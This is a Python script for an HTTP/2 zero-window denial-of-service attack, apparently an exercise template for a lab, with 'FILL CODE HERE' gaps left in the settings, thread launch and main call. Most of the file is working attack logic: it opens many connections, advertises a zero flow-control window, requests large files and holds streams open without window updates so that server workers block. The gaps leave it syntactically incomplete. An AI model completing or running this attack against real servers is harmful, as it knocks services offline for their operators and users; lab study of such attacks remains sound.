#!/usr/bin/env python3
"""
HTTP/2 Zero Window Attack - Lab Version
Adapted for defensive security research in controlled lab environment.

This attack exploits a fundamental design flaw in the HTTP/2 protocol's flow control
mechanism. By setting INITIAL_WINDOW_SIZE=0, clients can force servers to indefinitely
hold worker threads while waiting for window updates that never come.

PROTOCOL BACKDOOR: HTTP/2's flow control was designed for legitimate traffic management,
but this same mechanism can be weaponized to create denial of service conditions by
manipulating the window size field in SETTINGS frames.
"""

import socket
import threading
import h2.connection
import h2.events
import time
import argparse
import logging
import sys
from typing import List
import signal

class HTTP2ZeroWindowAttack:
    """HTTP/2 Zero Window Attack implementation for lab environment"""
    
    def __init__(self, target_host: str, target_port: int = 80, num_connections: int = 512):
        self.target_host = target_host
        self.target_port = target_port
        self.num_connections = num_connections
        self.active_connections: List[socket.socket] = []
        self.attack_active = True
        
    def create_connection(self, conn_id: int) -> bool:
        """Create a single HTTP/2 connection with zero window size"""
        try:
            # Create TCP connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(10.0)
            
            logging.info(f"[Connection {conn_id}] Connecting to {self.target_host}:{self.target_port}")
            sock.connect((self.target_host, self.target_port))
            
            # Initialize HTTP/2 connection
            h2_conn = h2.connection.H2Connection()
            h2_conn.initiate_connection()
            
            # Send connection preface
            sock.sendall(h2_conn.data_to_send())
            
            # Configure the needed settings
            h2_conn.update_settings({
                h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: # FILL CODE HERE,
                h2.settings.SettingCodes.MAX_FRAME_SIZE: # FILL CODE HERE
            })
            sock.sendall(h2_conn.data_to_send())
            
            # Wait for server settings
            data = sock.recv(1024)
            events = h2_conn.receive_data(data)
            
            for event in events:
                if isinstance(event, h2.events.RemoteSettingsChanged):
                    logging.debug(f"[Connection {conn_id}] Server settings received")
                elif isinstance(event, h2.events.SettingsAcknowledged):
                    logging.debug(f"[Connection {conn_id}] Settings acknowledged")
            
            # Send settings ACK
            sock.sendall(h2_conn.data_to_send())
            
            # Create multiple streams to maximize impact
            for stream_id in range(1, 9, 2):  # Streams 1, 3, 5, 7
                headers = [
                    (':method', 'GET'),
                    (':path', '/large-test.jpg'),  # Request large file
                    (':scheme', 'http'),
                    (':authority', f'{self.target_host}:{self.target_port}'),
                    ('accept', '*/*'),
                    ('accept-encoding', 'identity'),  # Prevent compression
                    ('cache-control', 'no-cache')
                ]
                
                h2_conn.send_headers(stream_id, headers, end_stream=True)
                sock.sendall(h2_conn.data_to_send())
                
                logging.debug(f"[Connection {conn_id}] Created stream {stream_id}")
            
            # Keep connection alive and monitor
            self.maintain_connection(sock, h2_conn, conn_id)
            return True
            
        except Exception as e:
            logging.error(f"[Connection {conn_id}] Failed: {e}")
            if 'sock' in locals():
                sock.close()
            return False
    
    def maintain_connection(self, sock: socket.socket, h2_conn: h2.connection.H2Connection, conn_id: int):
        """Maintain connection and handle server responses without updating window"""
        logging.info(f"[Connection {conn_id}] Maintaining zero window connection")
        
        sock.settimeout(1.0)  # Non-blocking reads
        last_ping = time.time()
        
        while self.attack_active:
            try:
                # Try to read data without processing it (simulating blocked client)
                try:
                    data = sock.recv(4096)
                    if data:
                        # Receive events but don't send window updates
                        events = h2_conn.receive_data(data)
                        
                        # Log any data frames received (these should block server)
                        for event in events:
                            if isinstance(event, h2.events.DataReceived):
                                logging.debug(f"[Connection {conn_id}] Received {len(event.data)} bytes on stream {event.stream_id}")
                                # Deliberately NOT calling h2_conn.increment_flow_control_window()
                                # This keeps the window at 0 and blocks the server
                    else:
                        logging.warning(f"[Connection {conn_id}] Server closed connection")
                        break
                        
                except socket.timeout:
                    # Timeout is expected, continue maintaining connection
                    pass
                
                # Send periodic ping to keep connection alive
                current_time = time.time()
                if current_time - last_ping > 30:  # Ping every 30 seconds
                    try:
                        ping_data = int(current_time * 1000).to_bytes(8, 'big')
                        h2_conn.ping(ping_data)
                        sock.sendall(h2_conn.data_to_send())
                        last_ping = current_time
                        logging.debug(f"[Connection {conn_id}] Sent keep-alive ping")
                    except Exception as ping_error:
                        logging.error(f"[Connection {conn_id}] Ping failed: {ping_error}")
                        break
                
                time.sleep(1)
                
            except Exception as e:
                logging.error(f"[Connection {conn_id}] Connection maintenance error: {e}")
                break
        
        # Cleanup
        try:
            sock.close()
        except:
            pass
        logging.info(f"[Connection {conn_id}] Connection closed")
    
    def run_attack(self):
        """Launch the HTTP/2 zero window attack"""
        logging.info(f"🚀 Starting HTTP/2 Zero Window Attack")
        logging.info(f"🎯 Target: {self.target_host}:{self.target_port}")
        logging.info(f"🔗 Connections: {self.num_connections}")
        logging.info(f"💀 Attack: Zero INITIAL_WINDOW_SIZE Flow Control")
        
        threads = []
        
        # Create attack threads
        for i in range(self.num_connections):
            # FILL CODE HERE: Create and start a thread for create_connection
            
            # Stagger connection attempts
            time.sleep(0.2)
        
        logging.info(f"📡 All {self.num_connections} attack threads launched")
        
        try:
            # Monitor attack progress
            while self.attack_active:
                active_threads = sum(1 for t in threads if t.is_alive())
                logging.info(f"📊 Active connections: {active_threads}/{self.num_connections}")
                time.sleep(10)
                
        except KeyboardInterrupt:
            logging.info("\n🛑 Attack interrupted by user")
            self.stop_attack()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join(timeout=5)
        
        logging.info("✅ Attack completed")
    
    def stop_attack(self):
        """Stop the attack gracefully"""
        self.attack_active = False
        logging.info("🔴 Stopping attack...")

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    logging.info("\n🛑 Received shutdown signal")
    sys.exit(0)

def test_target_connectivity(host: str, port: int) -> bool:
    """Test if target is reachable"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception:
        return False

def main():
    parser = argparse.ArgumentParser(
        description='HTTP/2 Zero Window Attack - Lab Version',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Attack lab Apache container (from within attacker container)
  python3 h2_zero_window_exploit.py apache-victim --port 80 --connections 20
  
  # Attack with verbose logging
  python3 h2_zero_window_exploit.py apache-victim --port 80 --connections 15 --verbose
        """
    )
    
    parser.add_argument('target', help='Target hostname (e.g., apache-victim)')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--connections', type=int, default=512, 
                       help='Number of concurrent connections (default: 512)')
    parser.add_argument('--verbose', '-v', action='store_true', 
                       help='Enable verbose logging')
    
    args = parser.parse_args()
    
    # Setup logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format='%(asctime)s [%(levelname)s] %(message)s',
        datefmt='%H:%M:%S'
    )
    
    # Suppress noisy h2/hpack debug messages
    logging.getLogger('h2').setLevel(logging.WARNING)
    logging.getLogger('hpack').setLevel(logging.WARNING)
    
    # Install signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Validate target connectivity
    logging.info(f"🔍 Testing connectivity to {args.target}:{args.port}")
    if not test_target_connectivity(args.target, args.port):
        logging.error(f"❌ Cannot reach {args.target}:{args.port}")
        logging.error("💡 Make sure the lab is running: ./run_lab.sh")
        return 1
    
    logging.info(f"✅ Target {args.target}:{args.port} is reachable")
    
    # Create and run attack
    try:
        # FILL CODE HERE: Create and run the attack
    except Exception as e:
        logging.error(f"💥 Attack failed: {e}")
        return 1
    
    return 0

if __name__ == '__main__':
    sys.exit(main())